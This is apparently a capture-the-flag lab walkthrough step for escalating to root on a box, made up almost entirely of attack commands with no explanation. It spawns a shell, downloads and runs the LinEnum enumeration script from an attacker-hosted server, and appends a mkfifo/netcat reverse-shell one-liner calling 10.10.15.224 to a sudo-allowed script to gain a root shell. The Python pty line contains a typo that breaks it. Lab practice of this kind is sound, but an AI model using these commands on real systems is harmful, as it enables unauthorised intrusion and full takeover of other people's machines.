**Escalate privileges and submit the root.txt flag
```
python3 -c "impor pty; pty.spawn('/bin/bash')"
sudo -l
```

```
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
python3 -m http.server 8080
nc -lvnp 8443
```

```
cd /tmp
wget http://10.10.15.224:8080/LinEnum.sh
bash LinEnum.sh
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.224 8443 >/tmp/f' >> /home/nibbler/personal/stuff/monitor.sh
sudo /home/nibbler/personal/stuff/monitor.sh
```

```
cat /root.txt
```
